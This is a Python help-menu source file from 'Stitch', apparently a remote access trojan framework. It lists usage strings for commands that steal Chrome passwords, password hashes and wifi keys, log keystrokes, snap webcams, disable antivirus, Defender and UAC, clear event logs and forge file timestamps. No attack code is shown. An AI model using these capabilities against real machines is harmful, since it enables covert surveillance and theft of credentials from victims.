#!/usr/bin/env python
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

from stitch_utils import st_print


################################################################################
#                        Start of USAGE Section                                #
################################################################################
class HelpSpecifics(object):
    def __init__(self): pass

    @staticmethod
    def usage_addkey(): st_print('[*] Usage: addkey [encrypted AES key]\n')

    @staticmethod
    def usage_askpassword(): st_print('[*] Usage: askPassword\n')

    @staticmethod
    def usage_avscan(): st_print('[*] Usage: avscan\n')

    @staticmethod
    def usage_avkill(): st_print("[*] Usage: avkill\n")

    @staticmethod
    def usage_cat(): st_print('[*] Usage: cat [path]\n')

    @staticmethod
    def usage_cd(): st_print('[*] Usage: cd [path]\n')

    @staticmethod
    def usage_chromedump(): st_print('[*] Usage: chromedump\n')

    @staticmethod
    def usage_cls(): st_print('[*] Usage: cls\n')

    @staticmethod
    def usage_clear(): st_print('[*] Usage: clear\n')

    @staticmethod
    def usage_clearev(): st_print('[*] Usage: clearev\n')

    @staticmethod
    def usage_connect(): st_print("[*] Usage: connect [target] [port]\n")

    @staticmethod
    def usage_crackpassword(): st_print('[*] Usage: crackpassword\n')

    @staticmethod
    def usage_dir(): st_print('[*] Usage: dir\n')

    @staticmethod
    def usage_disableRDP(): st_print('[*] Usage: disableRDP\n')

    @staticmethod
    def usage_disableUAC(): st_print('[*] Usage: disableUAC\n')

    @staticmethod
    def usage_disableWindef(): st_print('[*] Usage: disableWindef\n')

    @staticmethod
    def usage_displayoff(): st_print('[*] Usage: displayoff\n')

    @staticmethod
    def usage_displayon(): st_print('[*] Usage: displayon\n')

    @staticmethod
    def usage_download(): st_print("[*] Usage: download [path]\n")

    @staticmethod
    def usage_drives(): st_print('[*] Usage: drives\n')

    @staticmethod
    def usage_editaccessed(): st_print('[*] Usage: editaccessed [path]\n')

    @staticmethod
    def usage_editcreated(): st_print('[*] Usage: editcreated [path]\n')

    @staticmethod
    def usage_editmodified(): st_print('[*] Usage: editmodified [path]\n')

    @staticmethod
    def usage_enableRDP(): st_print('[*] Usage: enableRDP\n')

    @staticmethod
    def usage_enableUAC(): st_print('[*] Usage: enableUAC\n')

    @staticmethod
    def usage_enableWindef(): st_print('[*] Usage: enableWindef\n')

    @staticmethod
    def usage_environment(): st_print('[*] Usage: environment\n')

    @staticmethod
    def usage_fileinfo(): st_print('[*] Usage: fileinfo [path]\n')

    @staticmethod
    def usage_firewall(): st_print(
        '[*] Usage: firewall status\n[*] Usage: firewall [open/close] [port] [in/out] [tcp/udp]\n')

    @staticmethod
    def usage_freeze(): st_print('[*] Usage: freeze [status/start/stop]\n')

    @staticmethod
    def usage_hashdump(): st_print('[*] Usage: hashdump\n')

    @staticmethod
    def usage_hide(): st_print('[*] Usage: hide [file/dir]\n')

    @staticmethod
    def usage_history(): st_print('[*] Usage: history\n')

    @staticmethod
    def usage_history_remove(): st_print('[*] Usage: history_remove [target]\n')

    @staticmethod
    def usage_home(): st_print('[*] Usage: home\n')

    @staticmethod
    def usage_hostsfile(): st_print('[*] Usage: hostsfile [update/remove/show]\n')

    @staticmethod
    def usage_ifconfig(): st_print('[*] Usage: ifconfig\n')

    @staticmethod
    def usage_ipconfig(): st_print('[*] Usage: ipconfig\n')

    @staticmethod
    def usage_keylogger(): st_print('[*] Usage: keylogger [status/start/stop/dump]\n')

    @staticmethod
    def usage_location(): st_print('[*] Usage: location\n')

    @staticmethod
    def usage_lockscreen(): st_print('[*] Usage: lockscreen\n')

    @staticmethod
    def usage_logintext(): st_print('[*] Usage: logintext\n')

    @staticmethod
    def usage_lsmod(): st_print('[*] Usage: lsmod\n')

    @staticmethod
    def usage_ls(): st_print('[*] Usage: ls\n')

    @staticmethod
    def usage_listen(): st_print('[*] Usage: listen [port]\n')

    @staticmethod
    def usage_more(): st_print('[*] Usage: more [path]\n')

    @staticmethod
    def usage_popup(): st_print('[*] Usage: popup\n')

    @staticmethod
    def usage_pwd(): st_print('[*] Usage: pwd\n')

    @staticmethod
    def usage_ps(): st_print('[*] Usage: ps\n')

    @staticmethod
    def usage_pyexec(): st_print("[*] Usage: pyexec [python script]\n")

    @staticmethod
    def usage_scanreg(): st_print('[*] Usage: scanreg\n')

    @staticmethod
    def usage_screenshot(): st_print('[*] Usage: screenshot\n')

    @staticmethod
    def usage_sessions(): st_print('[*] Usage: sessions\n')

    @staticmethod
    def usage_shell(): st_print('[*] Usage: shell [session]\n')

    @staticmethod
    def usage_showkey(): st_print('[*] Usage: showkey\n')

    @staticmethod
    def usage_ssh(): st_print('[*] Usage: ssh\n')

    @staticmethod
    def usage_start(): st_print('[*] Usage: run [path]\n')

    @staticmethod
    def usage_stitchgen(): st_print('[*] Usage: stitch_gen\n')

    @staticmethod
    def usage_sudo(): st_print('[*] Usage: sudo [command]\n')

    @staticmethod
    def usage_sysinfo(): st_print('[*] Usage: sysinfo\n')

    @staticmethod
    def usage_touch(): st_print('[*] Usage: touch [path]\n')

    @staticmethod
    def usage_unhide(): st_print('[*] Usage: unhide [file/dir]\n')

    @staticmethod
    def usage_upload(): st_print("[*] Usage: upload [file/dir]\n")

    @staticmethod
    def usage_vmscan(): st_print('[*] Usage: vmscan\n')

    @staticmethod
    def usage_webcamsnap(): st_print('[*] Usage: webcamsnap [device]\n')

    @staticmethod
    def usage_webcamlist(): st_print('[*] Usage: webcamlist\n')

    @staticmethod
    def usage_wifikeys(): st_print("[*] Usage: wifikeys\n")

    @staticmethod
    def usage_exit(): st_print('[*] Usage: exit\n')


################################################################################
#                        Start of HELP Section                                 #
################################################################################

class HelpMenu(object):
    def __init__(self):
        self._usage = HelpSpecifics()

    def st_help_addkey(self):
        st_print("[*] Adds an AES key to the library; allowing communication with "
                 "Stitch payloads which use that encryption key.")
        self._usage.usage_addkey()

    def st_help_askpassword(self):
        st_print("[*] Displays security password prompt and returns user's input.")
        self._usage.usage_askpassword()

    def st_help_avscan(self):
        st_print('[*] Scans and lists possible Antiviruses installed.')
        self._usage.usage_avscan()

    def st_help_avkill(self):
        st_print('[*] Attempts to terminate detected Antiviruses running.')
        self._usage.usage_avkill()

    def st_help_cat(self):
        st_print('[*] Displays content of the file.')
        self._usage.usage_cat()

    def st_help_cd(self):
        st_print('[*] Displays the name of or changes the current directory.')
        self._usage.usage_cd()

    def st_help_chromedump(self):
        st_print('[*] Retrieves all passwords stored by Chrome.')
        self._usage.usage_chromedump()

    def st_help_cls(self):
        st_print('[*] Clears the screen.')
        self._usage.usage_cls()

    def st_help_clear(self):
        st_print('[*] Clears the screen.')
        self._usage.usage_clear()

    def st_help_clearev(self):
        st_print('[*] Clears System, Security, and application event logs on a Windows machine.')
        self._usage.usage_clearev()

    def st_help_connect(self):
        st_print('[*] Attempts to connect to a server running a stitch payload.')
        self._usage.usage_connect()

    def st_help_crackpassword(self):
        st_print('[*] Attempts to crack the sudo password by using a dictionary attack.')
        self._usage.usage_crackpassword()

    def st_help_dir(self):
        st_print('[*] Displays a list of files and subdirectories in a directory.')
        self._usage.usage_dir()

    def st_help_disableRDP(self):
        st_print('[*] Disables Remote Desktop Protocol feature.')
        self._usage.usage_disableRDP()

    def st_help_disableUAC(self):
        st_print('[*] Disables the User Account Control feature.')
        self._usage.usage_disableUAC()

    def st_help_disableWindef(self):
        st_print('[*] Disables Windows Defender.')
        self._usage.usage_disableWindef()

    def st_help_displayoff(self):
        st_print("[*] Turns off the display monitors.")
        self._usage.usage_displayoff()

    def st_help_displayon(self):
        st_print("[*] Turns on the display monitors.")
        self._usage.usage_displayon()

    def st_help_download(self):
        st_print('[*] Downloads the specified file/dir to the Stitch Downloads folder.')
        self._usage.usage_download()

    def st_help_drives(self):
        st_print('[*] Displays info of all drives on the system.')
        self._usage.usage_drives()

    def st_help_editaccessed(self):
        st_print('[*] Edits the "Accessed" date of a file.')
        self._usage.usage_editaccessed()

    def st_help_editcreated(self):
        st_print('[*] Edits the "Created" date of a file')
        self._usage.usage_editcreated()

    def st_help_editmodified(self):
        st_print('[*] Edits the "Modified" date of a file.')
        self._usage.usage_editmodified()

    def st_help_enableRDP(self):
        st_print('[*] Enables Remote Desktop Protocol feature.')
        self._usage.usage_enableRDP()

    def st_help_enableUAC(self):
        st_print('[*] Enables the User Account Control feature.')
        self._usage.usage_enableUAC()

    def st_help_enableWindef(self):
        st_print('[*] Enables Windows Defender.')
        self._usage.usage_enableWindef()

    def st_help_environment(self):
        st_print("[*] Displays the system's environment variables.")
        self._usage.usage_environment()

    def st_help_fileinfo(self):
        st_print('[*] Disaplys file information.')
        self._usage.usage_fileinfo()

    def st_help_firewall(self):
        st_print('[*] Displays firewall status, open/close ports, or allow a program.')
        self._usage.usage_firewall()

    def st_help_freeze(self):
        st_print("[*] Freezes the mouse and keyboard of the system. Allowing you to start/stop and view the status.")
        self._usage.usage_freeze()

    def st_help_hashdump(self):
        st_print('[*] Grabs the password hashes stored on the system.')
        self._usage.usage_hashdump()

    def st_help_hide(self):
        st_print('[*] Hides the specified file/dir from the user.')
        self._usage.usage_hide()

    def st_help_history(self):
        st_print('[*] Displays information of past shell connections.')
        self._usage.usage_history()

    def st_help_history_remove(self):
        st_print('[*] Removes the system from your history.')
        self._usage.usage_history_remove()

    def st_help_home(self):
        st_print('[*] Clears the screen and displays the Stitch banner.')
        self._usage.usage_home()

    def st_help_hostsfile(self):
        st_print("[*] Updates, removes, or shows desired hostname and IP address from the system's hosts file.")
        self._usage.usage_hostsfile()

    def st_help_ifconfig(self):
        st_print("[*] Displays the system's IP configuration.")
        self._usage.usage_ifconfig()

    def st_help_ipconfig(self):
        st_print("[*] Displays the system's IP configuration.")
        self._usage.usage_ipconfig()

    def st_help_keylogger(self):
        st_print(
            "[*] Records keystrokes of the user. Allowing you to view the status, start, stop, and dump the keystokes to screen.")
        self._usage.usage_keylogger()

    def st_help_location(self):
        st_print("[*] Gives public IP and estimate geo location of the system.")
        self._usage.usage_location()

    def st_help_lockscreen(self):
        st_print("[*] Enters the system's lock screen.")
        self._usage.usage_lockscreen()

    def st_help_logintext(self):
        st_print("[*] Sets the text of the system's login screen.")
        self._usage.usage_logintext()

    def st_help_ls(self):
        st_print('[*] Displays a list of files and subdirectories in a directory.')
        self._usage.usage_ls()

    def st_help_lsmod(self):
        st_print('[*] Displays list of all installed drivers.')
        self._usage.usage_lsmod()

    def st_help_listen(self):
        st_print('[*] Server binds to given port to listen for connections.')
        self._usage.usage_listen()

    def st_help_more(self):
        st_print('[*] Displays ouput of file path.')
        self._usage.usage_more()

    def st_help_popup(self):
        st_print("[*] Displays popup box with custom message.")
        self._usage.usage_popup()

    def st_help_pwd(self):
        st_print('[*] Displays the name of the current directory.')
        self._usage.usage_pwd()

    def st_help_pyexec(self):
        st_print('[*] Runs python script on the system.')
        self._usage.usage_pyexec()

    def st_help_ps(self):
        st_print('[*] Displays list of all running processes.')
        self._usage.usage_ps()

    def st_help_scanreg(self):
        st_print('[*] Display information on Windows Registry.')
        self._usage.usage_scanreg()

    def st_help_screenshot(self):
        st_print('[*] Takes a screenshot of the screen.')
        self._usage.usage_screenshot()

    def st_help_sessions(self):
        st_print('[*] Displays machines available for exploitation.')
        self._usage.usage_sessions()

    def st_help_shell(self):
        st_print('[*] Opens a shell prompt of the requested session.')
        self._usage.usage_shell()

    def st_help_showkey(self):
        st_print('[*] Displays the active encrypted AES key used for payload creation.')
        self._usage.usage_showkey()

    def st_help_ssh(self):
        st_print('[*] Attempts to open a ssh connection to the requested host.')
        self._usage.usage_ssh()

    def st_help_start(self):
        st_print('[*] Starts the desired file.')
        self._usage.usage_start()

    def st_help_stitchgen(self):
        st_print('[*] Generates stitch payloads based on running OS.')
        self._usage.usage_stitchgen()

    def st_help_sudo(self):
        st_print("[*] Runs the preceding command with admin priveleges.")
        self._usage.usage_sudo()

    def st_help_sysinfo(self):
        st_print('[*] Displays system information.')
        self._usage.usage_sysinfo()

    def st_help_touch(self):
        st_print('[*] Creates a file with no contents.')
        self._usage.usage_touch()

    def st_help_unhide(self):
        st_print('[*] Unhides the specified file/dir from the user.')
        self._usage.usage_unhide()

    def st_help_upload(self):
        st_print('[*] Uploads a file/dir to the system.')
        self._usage.usage_upload()

    def st_help_vmscan(self):
        st_print('[*] Detects if the system is a virtual machine.')
        self._usage.usage_vmscan()

    def st_help_webcamsnap(self):
        st_print('[*] Takes and downloads a picture using a connected webcamera.')
        self._usage.usage_webcamsnap()

    def st_help_webcamlist(self):
        st_print('[*] Displays list of connected webcameras.')
        self._usage.usage_webcamlist()

    def st_help_wifikeys(self):
        st_print('[*] Displays all saved wifi passwords on the system.')
        self._usage.usage_wifikeys()

    def st_help_exit(self):
        st_print('[*] Exits Stitch.')
        self._usage.usage_exit()

    def st_help_EOF(self):
        st_print('[*] Exits Stitch.')
        self._usage.usage_exit()
